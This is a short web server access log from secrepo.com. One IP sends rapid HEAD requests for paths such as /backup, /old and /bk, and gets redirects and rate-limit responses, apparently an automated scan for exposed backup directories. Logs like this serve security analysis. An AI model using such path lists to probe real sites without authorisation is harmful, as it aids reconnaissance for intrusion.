216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /bc HTTP/1.1" 429 182 "http://secrepo.com/bc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /bk HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /bk HTTP/1.1" 429 182 "http://secrepo.com/bk" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /backup HTTP/1.1" 301 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /backup HTTP/1.1" 429 182 "http://secrepo.com/backup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /old HTTP/1.1" 301 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /old HTTP/1.1" 429 182 "http://secrepo.com/old" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:45 -0700] "HEAD /new HTTP/1.1" 301 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
